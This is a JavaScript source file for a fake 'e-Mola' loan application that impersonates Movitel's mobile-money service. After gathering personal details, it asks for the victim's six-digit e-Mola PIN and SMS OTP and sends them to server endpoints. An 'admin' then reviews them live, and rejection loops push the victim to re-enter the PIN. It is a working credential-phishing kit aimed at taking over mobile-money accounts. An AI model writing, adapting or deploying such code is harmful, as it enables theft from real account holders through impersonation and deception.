// ============================================================
// e-Mola Loan App – 6-digit PIN & 6-digit OTP
// ============================================================

// Language translations (Portuguese / English)
const translations = {
  pt: {
    welcome: 'Bem-vindo ao e-Mola',
    tagline: 'Empréstimos rápidos e fáceis através do e-Mola',
    calculator: 'Calculadora de Empréstimo',
    amount: 'Montante',
    term: 'Prazo',
    monthly: 'Pagamento Mensal',
    start: 'COMEÇAR',
    footer: '© 2026 e-Mola Empréstimos – Movitel',
    back: 'Voltar',
    loan_application: 'Pedido de Empréstimo',
    step1_sub: 'Passo 1 de 4',
    step2_sub: 'Passo 2 de 4',
    step3_sub: 'Passo 3 de 4',
    pin_step_sub: 'Passo final de verificação',
    loan_type: 'Tipo de Empréstimo',
    loan_amount: 'Montante (MZN)',
    loan_term: 'Prazo',
    purpose: 'Finalidade',
    next: 'PRÓXIMO PASSO',
    first_name: 'Primeiro Nome',
    last_name: 'Apelido',
    phone_label: 'Número de Telemóvel (Moçambique)',
    phone_hint: '9 dígitos sem o prefixo +258 (ex: 841234567)',
    employment: 'Situação Profissional',
    annual_income: 'Rendimento Anual (MZN)',
    kin_name: 'Nome do Familiar Próximo',
    kin_phone: 'Telemóvel do Familiar',
    summary: 'Resumo do Pedido',
    applicant: 'Requerente',
    submit: 'SUBMETER PEDIDO',
    processing: 'A Processar Pedido...',
    processing_sub: 'Aguarde enquanto processamos o seu pedido',
    awaiting: '⏳ A aguardar aprovação do administrador...',
    enter_pin: 'Introduza o PIN e-Mola',
    pin_label: 'Introduza o seu PIN e-Mola (6 dígitos):',
    submit_pin: 'SUBMETER PIN',
    verifying_pin: 'A Verificar PIN...',
    verifying_pin_sub: 'O seu PIN foi recebido. Aguarde a verificação do administrador...',
    admin_reviewing_pin: '⏳ O administrador está a analisar o seu PIN...',
    enter_otp: 'Introduza o Código OTP',
    otp_sub: 'Código de 6 dígitos enviado via SMS',
    otp_label: 'Código OTP (6 dígitos):',
    verify_otp: 'VERIFICAR E APROVAR',
    verifying_otp: 'A Verificar OTP...',
    verifying_otp_sub: 'O seu código foi recebido. Aguarde a verificação do administrador...',
    admin_reviewing_otp: '⏳ O administrador está a verificar o seu OTP...',
    app_id: 'ID do Pedido:',
    approved_title: 'Empréstimo Aprovado!',
    approved_sub: 'O seu empréstimo foi aprovado com sucesso.',
    amount_receive: 'Montante a Receber',
    important: 'Informação Importante',
    important_text: 'Os fundos serão depositados diretamente na sua conta e-Mola dentro de 5 minutos. Assegure‑se de que o seu número está correto.',
    loan_details: 'Detalhes do Empréstimo',
    next_steps: 'Próximos Passos:',
    next_steps_text: 'Configurar pagamento automático na sua conta e-Mola.',
    finish: 'CONCLUIR',
    personal: 'Empréstimo Pessoal',
    business: 'Empréstimo Comercial',
    home: 'Empréstimo Habitacional',
    student: 'Empréstimo Estudantil',
    m6: '6 Meses',
    m12: '12 Meses',
    m24: '24 Meses',
    m48: '48 Meses',
    employed: 'Empregado',
    self_employed: 'Trabalhador por conta própria',
    unemployed: 'Desempregado',
    retired: 'Reformado'
  },
  en: {
    welcome: 'Welcome to e-Mola',
    tagline: 'Fast, easy loans through e-Mola',
    calculator: 'Loan Calculator',
    amount: 'Amount',
    term: 'Term',
    monthly: 'Monthly Payment',
    start: 'START',
    footer: '© 2026 e-Mola Loans – Movitel',
    back: 'Back',
    loan_application: 'Loan Application',
    step1_sub: 'Step 1 of 4',
    step2_sub: 'Step 2 of 4',
    step3_sub: 'Step 3 of 4',
    pin_step_sub: 'Final verification step',
    loan_type: 'Loan Type',
    loan_amount: 'Amount (MZN)',
    loan_term: 'Term',
    purpose: 'Purpose',
    next: 'NEXT STEP',
    first_name: 'First Name',
    last_name: 'Last Name',
    phone_label: 'Phone Number (Mozambique)',
    phone_hint: '9 digits without +258 prefix (e.g., 841234567)',
    employment: 'Employment Status',
    annual_income: 'Annual Income (MZN)',
    kin_name: 'Next of Kin Name',
    kin_phone: 'Next of Kin Phone',
    summary: 'Application Summary',
    applicant: 'Applicant',
    submit: 'SUBMIT APPLICATION',
    processing: 'Processing Application...',
    processing_sub: 'Please wait while we process your application',
    awaiting: '⏳ Awaiting admin approval...',
    enter_pin: 'Enter e-Mola PIN',
    pin_label: 'Enter your e-Mola PIN (6 digits):',
    submit_pin: 'SUBMIT PIN',
    verifying_pin: 'Verifying PIN...',
    verifying_pin_sub: 'Your PIN has been received. Please wait for admin verification...',
    admin_reviewing_pin: '⏳ Admin is reviewing your PIN...',
    enter_otp: 'Enter OTP Code',
    otp_sub: '6-digit code sent via SMS',
    otp_label: 'OTP Code (6 digits):',
    verify_otp: 'VERIFY & APPROVE',
    verifying_otp: 'Verifying OTP...',
    verifying_otp_sub: 'Your code has been received. Please wait for admin verification...',
    admin_reviewing_otp: '⏳ Admin is verifying your OTP...',
    app_id: 'Application ID:',
    approved_title: 'Loan Approved!',
    approved_sub: 'Your loan has been successfully approved.',
    amount_receive: 'Amount to Receive',
    important: 'Important Information',
    important_text: 'The funds will be deposited directly to your e-Mola account within 5 minutes. Please ensure your phone number is correct.',
    loan_details: 'Loan Details',
    next_steps: 'Next Steps:',
    next_steps_text: 'Set up automatic payment on your e-Mola account.',
    finish: 'FINISH',
    personal: 'Personal Loan',
    business: 'Business Loan',
    home: 'Home Loan',
    student: 'Student Loan',
    m6: '6 Months',
    m12: '12 Months',
    m24: '24 Months',
    m48: '48 Months',
    employed: 'Employed',
    self_employed: 'Self-employed',
    unemployed: 'Unemployed',
    retired: 'Retired'
  }
};

let currentLang = localStorage.getItem('emola_lang') || 'pt';

function toggleLanguage() {
  currentLang = currentLang === 'pt' ? 'en' : 'pt';
  localStorage.setItem('emola_lang', currentLang);
  applyLanguage();
}

function applyLanguage() {
  document.querySelectorAll('[data-i18n]').forEach(el => {
    const key = el.getAttribute('data-i18n');
    if (translations[currentLang][key]) {
      el.textContent = translations[currentLang][key];
    }
  });
  document.getElementById('langIcon').textContent = currentLang === 'pt' ? '🌐 EN' : '🌐 PT';
}

// State
const S = {
  loanType: '',
  loanAmount: 0,
  loanTerm: '',
  loanPurpose: '',
  firstName: '',
  lastName: '',
  phone: '',
  employment: '',
  annualIncome: 0,
  kinName: '',
  kinPhone: '',
  applicationId: '',
  rejectedStep: null
};

let currentPollTimeout = null;
let pinBlockTimer = null;

// localStorage
const STORAGE_KEYS = {
  APPLICATION_ID: 'emola_application_id',
  APPLICATION_DATA: 'emola_application_data',
  REJECTION_INFO: 'emola_rejection_info',
  FORM_DRAFT: 'emola_form_draft'
};

function saveToLocalStorage(key, data) {
  try {
    localStorage.setItem(key, JSON.stringify(data));
    console.log(`💾 Saved: ${key}`);
  } catch (error) {
    console.error(`❌ Save failed: ${key}`, error);
  }
}

function getFromLocalStorage(key) {
  try {
    const data = localStorage.getItem(key);
    return data ? JSON.parse(data) : null;
  } catch (error) {
    return null;
  }
}

function removeFromLocalStorage(key) {
  try {
    localStorage.removeItem(key);
  } catch (error) {}
}

function saveApplicationId(id) {
  if (id) {
    S.applicationId = id;
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
      id,
      timestamp: new Date().toISOString()
    });
  }
}

function loadApplicationId() {
  const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
  if (saved && saved.id) {
    const age = Date.now() - new Date(saved.timestamp).getTime();
    if (age < 24 * 60 * 60 * 1000) {
      S.applicationId = saved.id;
      return saved.id;
    } else {
      removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    }
  }
  return null;
}

function saveApplicationData() {
  saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, {
    ...S,
    timestamp: new Date().toISOString()
  });
}

function loadApplicationData() {
  const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
  if (saved) {
    const age = Date.now() - new Date(saved.timestamp).getTime();
    if (age < 24 * 60 * 60 * 1000) {
      const fieldsToRestore = [
        'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
        'firstName', 'lastName', 'phone',
        'employment', 'annualIncome', 'kinName', 'kinPhone',
        'applicationId', 'rejectedStep'
      ];
      fieldsToRestore.forEach(field => {
        if (saved[field] !== undefined) S[field] = saved[field];
      });
      return true;
    } else {
      removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    }
  }
  return false;
}

function saveRejectionInfo(step, applicationId) {
  saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
    step,
    applicationId,
    timestamp: new Date().toISOString()
  });
}

function loadRejectionInfo() {
  const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
  if (saved) {
    const age = Date.now() - new Date(saved.timestamp).getTime();
    if (age < 5 * 60 * 1000) return saved;
    else removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
  }
  return null;
}

function clearRejectionInfo() {
  removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
}

function saveFormDraft() {
  const draft = {
    firstName: document.getElementById('s2fi')?.value || '',
    lastName: document.getElementById('s2la')?.value || '',
    phone: document.getElementById('s2ph')?.value || '',
    loanAmount: document.getElementById('s1am')?.value || '',
    loanPurpose: document.getElementById('s1pu')?.value || '',
    employment: document.getElementById('s3em')?.value || '',
    annualIncome: document.getElementById('s3in')?.value || '',
    kinName: document.getElementById('s3kn')?.value || '',
    kinPhone: document.getElementById('s3kp')?.value || '',
    timestamp: new Date().toISOString()
  };
  saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
}

function loadFormDraft() {
  const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
  if (draft) {
    const age = Date.now() - new Date(draft.timestamp).getTime();
    if (age < 24 * 60 * 60 * 1000) {
      if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
      if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
      if (draft.phone) document.getElementById('s2ph').value = draft.phone;
      if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
      if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
      if (draft.employment) document.getElementById('s3em').value = draft.employment;
      if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
      if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
      if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
      return true;
    } else {
      removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    }
  }
  return false;
}

// Navigation
function goTo(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const el = document.getElementById(pageId);
  if (el) el.classList.add('active');
  window.scrollTo(0, 0);
}

function startApplication() {
  S.rejectedStep = null;
  clearRejectionInfo();
  if (!S.applicationId) {
    S.applicationId = 'EMOLA-' + Date.now().toString().slice(-6);
    saveApplicationId(S.applicationId);
  }
  ['s1Err', 's2Err', 's3Err', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
  goTo('page-step1');
}

// Toast
function showToast(message, type = 'info', duration = 3000) {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();
  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.textContent = message;
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), duration);
}

// Helpers
function normalizePhone(id) {
  let inp = document.getElementById(id);
  let val = inp.value.replace(/\D/g, '');
  if (val.length > 9) val = val.substring(0, 9);
  inp.value = val;
  saveFormDraft();
}

function updateCalc() {
  const amt = +document.getElementById('amtSlider').value;
  document.getElementById('calcAmt').textContent = amt.toLocaleString() + ' MZN';
  const monthly = Math.ceil(amt / 48);
  document.getElementById('monthlyAmt').textContent = monthly.toLocaleString() + ' MZN';
}

function showErr(id, msg) {
  const box = document.getElementById(id);
  if (box) {
    box.classList.add('show');
    const txt = document.getElementById(id + 'Txt');
    if (txt) txt.textContent = msg;
  }
}

function clearErr(id) {
  const box = document.getElementById(id);
  if (box) box.classList.remove('show');
}

// Step navigation
function toS2() {
  const ty = document.getElementById('s1ty').value;
  const am = +document.getElementById('s1am').value;
  const te = document.getElementById('s1te').value;
  const pu = document.getElementById('s1pu').value;
  if (!ty || am <= 0 || !te || !pu.trim()) {
    showErr('s1Err', 'Por favor preencha todos os campos.');
    return;
  }
  S.loanType = ty;
  S.loanAmount = am;
  S.loanTerm = te;
  S.loanPurpose = pu;
  saveApplicationData();
  saveFormDraft();
  goTo('page-step2');
}

function toS3() {
  const fi = document.getElementById('s2fi').value.trim();
  const la = document.getElementById('s2la').value.trim();
  const ph = document.getElementById('s2ph').value;
  if (!fi || !la) {
    showErr('s2Err', 'Por favor introduza o seu nome completo.');
    return;
  }
  if (ph.length !== 9) {
    showErr('s2Err', 'Introduza um número de telefone válido de 9 dígitos.');
    return;
  }
  S.firstName = fi;
  S.lastName = la;
  S.phone = ph;
  saveApplicationData();
  saveFormDraft();
  goTo('page-step3');
}

// PIN helpers (6 digits)
function pinMvM(el, i) {
  el.value = el.value.replace(/\D/g, '');
  if (el.value && i < 5) {
    document.getElementById('pin' + (i + 1)).focus();
  }
  if (i === 5 && el.value) {
    const allFilled = [0,1,2,3,4,5].every(idx => document.getElementById('pin' + idx)?.value);
    if (allFilled) setTimeout(() => doPin(), 300);
  }
  chkPin();
}

function togPin() {
  for (let i = 0; i < 6; i++) {
    const b = document.getElementById('pin' + i);
    if (b) b.type = b.type === 'password' ? 'text' : 'password';
  }
  for (let i = 0; i < 6; i++) {
    const b = document.getElementById('otp' + i);
    if (b) b.type = b.type === 'password' ? 'text' : 'password';
  }
}

function chkPin() {
  const pinOk = [0,1,2,3,4,5].every(i => document.getElementById('pin' + i)?.value);
  const pinBtn = document.querySelector('#page-pin .btn-grad');
  if (pinBtn) pinBtn.disabled = !pinOk;
  const otpOk = [0,1,2,3,4,5].every(i => document.getElementById('otp' + i)?.value);
  const otpBtn = document.querySelector('#page-otp .btn-grad');
  if (otpBtn) otpBtn.disabled = !otpOk;
}

document.addEventListener('keyup', chkPin);

function clearLoginPin() {
  [0,1,2,3,4,5].forEach(i => document.getElementById('pin'+i).value = '');
  document.getElementById('pin0').focus();
  chkPin();
}

function clearOtpCode() {
  [0,1,2,3,4,5].forEach(i => document.getElementById('otp'+i).value = '');
  document.getElementById('otp0').focus();
  chkPin();
}

function handleOtpInput(el) {
  el.value = el.value.replace(/\D/g, '');
  const idx = parseInt(el.id.match(/\d$/)[0]);
  if (el.value && idx < 5) document.getElementById('otp' + (idx + 1))?.focus();
  chkPin();
  if (idx === 5 && el.value) {
    const allFilled = [0,1,2,3,4,5].every(i => document.getElementById('otp' + i)?.value);
    if (allFilled) setTimeout(() => doOtp(), 300);
  }
}

// PIN attempts
async function checkPinStatus() {
  try {
    const response = await fetch(`/api/status/${S.applicationId}/pin`);
    const data = await response.json();
    if (data.ok) {
      const remaining = data.remainingAttempts || 3;
      const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
      if (attemptsDisplay) {
        if (data.blocked) {
          attemptsDisplay.innerHTML = `🔒 Demasiadas tentativas. Bloqueado por ${data.blockRemainingSeconds}s`;
          attemptsDisplay.className = 'pin-attempts blocked';
          document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
          document.querySelector('#page-pin .btn-grad').disabled = true;
          startPinBlockCountdown(data.blockRemainingSeconds);
        } else {
          attemptsDisplay.innerHTML = `🔑 Tentativas restantes: ${remaining} de 3`;
          attemptsDisplay.className = 'pin-attempts';
        }
      }
      return data;
    }
  } catch (error) {
    console.error('Erro ao verificar PIN:', error);
  }
  return null;
}

function startPinBlockCountdown(seconds) {
  const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
  if (!attemptsDisplay) return;
  if (pinBlockTimer) clearInterval(pinBlockTimer);
  let remaining = seconds;
  attemptsDisplay.textContent = `🔒 Demasiadas tentativas. Bloqueado por ${remaining}s`;
  attemptsDisplay.className = 'pin-attempts blocked';
  pinBlockTimer = setInterval(() => {
    remaining--;
    if (remaining <= 0) {
      clearInterval(pinBlockTimer);
      pinBlockTimer = null;
      attemptsDisplay.textContent = '✅ PIN disponível. Tente novamente.';
      attemptsDisplay.className = 'pin-attempts available';
      document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
      document.querySelector('#page-pin .btn-grad').disabled = false;
      resetPinAttempts();
    } else {
      attemptsDisplay.textContent = `🔒 Demasiadas tentativas. Bloqueado por ${remaining}s`;
    }
  }, 1000);
}

async function resetPinAttempts() {
  try {
    await fetch(`/api/reset-pin-attempts/${S.applicationId}`, { method: 'POST' });
  } catch (error) {
    console.error('Erro ao repor tentativas:', error);
  }
}

// Polling
function startPoll(applicationId, step, onSuccess, onReject) {
  if (currentPollTimeout) clearTimeout(currentPollTimeout);
  const check = async () => {
    try {
      const res = await fetch(`/api/status/${applicationId}/${step}`);
      const data = await res.json();
      if (data && data.ok === true) {
        if (data.status === 'approved') {
          currentPollTimeout = null;
          onSuccess();
          return;
        } else if (data.status === 'rejected') {
          currentPollTimeout = null;
          onReject();
          return;
        }
      }
      currentPollTimeout = setTimeout(check, 2000);
    } catch (err) {
      currentPollTimeout = setTimeout(check, 3000);
    }
  };
  check();
}

// Approval & Dashboard
function showApproval() {
  document.getElementById('aprAmount').textContent = S.loanAmount.toLocaleString() + ' MZN';
  document.getElementById('aprAmt').textContent = S.loanAmount.toLocaleString() + ' MZN';
  document.getElementById('aprTerm').textContent = S.loanTerm;
  const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
  document.getElementById('aprMth').textContent = monthly.toLocaleString() + ' MZN';
  const finishBtn = document.querySelector('.rth-btn');
  finishBtn.textContent = currentLang === 'en' ? 'FINISH' : 'CONCLUIR';
  finishBtn.onclick = loadDashboard;
  Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
  if (pinBlockTimer) clearInterval(pinBlockTimer);
  goTo('page-approval');
}

async function loadDashboard() {
  try {
    const res = await fetch(`/api/dashboard/${S.applicationId}`);
    const data = await res.json();
    if (data.ok) {
      const dashBalance = document.getElementById('dashBalance');
      if (dashBalance) dashBalance.textContent = data.data.loanAmount.toLocaleString() + ' MZN';
      const dashId = document.getElementById('dashId');
      if (dashId) dashId.textContent = data.data.applicationId;
      const dashTerm = document.getElementById('dashTerm');
      if (dashTerm) dashTerm.textContent = data.data.loanTerm;
    }
    goTo('page-dashboard');
  } catch (err) {
    console.error('Erro no dashboard:', err);
    goTo('page-approval');
  }
}

// Submit application
async function submitApp() {
  const em = document.getElementById('s3em').value;
  const in_ = +document.getElementById('s3in').value;
  const kn = document.getElementById('s3kn').value.trim();
  const kp = document.getElementById('s3kp').value.trim();
  if (!em || in_ <= 0) {
    showErr('s3Err', 'Por favor preencha todos os campos.');
    return;
  }
  S.employment = em;
  S.annualIncome = in_;
  S.kinName = kn;
  S.kinPhone = kp;

  if (!S.applicationId) {
    S.applicationId = 'EMOLA-' + Date.now().toString().slice(-6);
    saveApplicationId(S.applicationId);
  }

  saveApplicationData();
  goTo('page-processing');

  try {
    const res = await fetch('/api/send-application', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationData: S })
    });
    const data = await res.json();
    if (data.ok) {
      S.applicationId = data.applicationId;
      saveApplicationId(S.applicationId);
      document.getElementById('processingStatus').innerHTML = '⏳ A aguardar aprovação do administrador...';
      startPoll(S.applicationId, 'app',
        () => {
          showToast('✅ Pedido Aprovado!', 'success');
          goTo('page-pin');
        },
        () => handleRejection('app')
      );
    } else {
      showErr('s3Err', data.message || 'Falha ao submeter pedido.');
    }
  } catch (err) {
    showErr('s3Err', 'Erro de rede. Tente novamente.');
  }
}

// PIN submission (6 digits)
async function doPin() {
  const pin = [0,1,2,3,4,5].map(i => document.getElementById('pin'+i).value).join('');
  if (pin.length < 6) {
    showErr('pinErr', 'Introduza um PIN e-Mola válido de 6 dígitos.');
    return;
  }
  const waitPinAppId = document.getElementById('waitPinAppId');
  if (waitPinAppId) waitPinAppId.textContent = S.applicationId;
  goTo('page-wait-pin');
  try {
    await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, pin })
    });
    startPoll(S.applicationId, 'pin',
      () => {
        showToast('✅ PIN Aprovado!', 'success');
        resetPinAttempts();
        goTo('page-otp');
      },
      async () => {
        const rejectRes = await fetch('/api/pin-rejected', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ applicationId: S.applicationId })
        });
        const rejectData = await rejectRes.json();
        if (rejectData.blocked) {
          showErr('pinErr', '🔒 Demasiadas tentativas. Bloqueado por 5 minutos.');
          checkPinStatus();
          goTo('page-pin');
        } else if (rejectData.remainingAttempts > 0) {
          showErr('pinErr', `❌ PIN errado. ${rejectData.remainingAttempts} tentativa(s) restante(s).`);
          document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
          document.getElementById('pin0').focus();
          const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
          if (attemptsDisplay) attemptsDisplay.textContent = `🔑 Tentativas restantes: ${rejectData.remainingAttempts} de 3`;
          goTo('page-pin');
        } else {
          handleRejection('pin');
        }
      }
    );
  } catch (err) {
    showErr('pinErr', 'Falha ao submeter PIN.');
    goTo('page-pin');
  }
}

// OTP submission (6 digits)
async function doOtp() {
  const otp = [0,1,2,3,4,5].map(i => document.getElementById('otp'+i).value).join('');
  if (otp.length < 6) {
    showErr('otpErr', 'Introduza um OTP válido de 6 dígitos.');
    return;
  }
  const waitOtpAppId = document.getElementById('waitOtpAppId');
  if (waitOtpAppId) waitOtpAppId.textContent = S.applicationId;
  goTo('page-wait-otp');
  try {
    await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, otp })
    });
    startPoll(S.applicationId, 'otp',
      () => {
        showToast('✅ OTP Aprovado! Empréstimo Aprovado 🎉', 'success');
        showApproval();
      },
      () => handleRejection('otp')
    );
  } catch (err) {
    showErr('otpErr', 'Falha ao submeter OTP.');
    goTo('page-otp');
  }
}

// Rejection handling
function handleRejection(step) {
  clearErr('s3Err');
  clearErr('pinErr');
  clearErr('otpErr');
  if (currentPollTimeout) clearTimeout(currentPollTimeout);
  saveRejectionInfo(step, S.applicationId);

  switch (step) {
    case 'app':
      showToast('❌ Pedido rejeitado. Recomece.', 'error');
      goTo('page-step1');
      break;
    case 'pin':
      showToast('❌ PIN rejeitado. Introduza novamente o seu PIN e-Mola.', 'error');
      document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
      document.getElementById('pin0').focus();
      checkPinStatus();
      goTo('page-pin');
      break;
    case 'otp':
      showToast('❌ OTP rejeitado. Peça um novo OTP.', 'error');
      clearOtpCode();
      goTo('page-otp');
      break;
    default:
      showToast('❌ Pedido rejeitado. Recomece.', 'error');
      goTo('page-step1');
  }
}

// Recovery on load
function recoverSession() {
  const appId = loadApplicationId();
  if (appId) console.log(`✅ ID do pedido: ${appId}`);
  const dataLoaded = loadApplicationData();
  if (dataLoaded) console.log('✅ Dados do pedido carregados');
  const rejection = loadRejectionInfo();
  if (rejection) {
    S.applicationId = rejection.applicationId;
    showToast(`⚠️ O seu ${rejection.step.toUpperCase()} foi rejeitado. Tente novamente.`, 'error');
    handleRejection(rejection.step);
    return true;
  }
  loadFormDraft();
  return false;
}

// Auto-save
document.addEventListener('input', (e) => {
  if (e.target.closest('#page-step1, #page-step2, #page-step3')) saveFormDraft();
  if (e.target.closest('#page-step2, #page-step3')) saveApplicationData();
});

// Init
updateCalc();
applyLanguage();
const recovered = recoverSession();
if (!recovered) goTo('page-landing');
console.log('✅ e-Mola Loan App (6-digit PIN & OTP) loaded!');
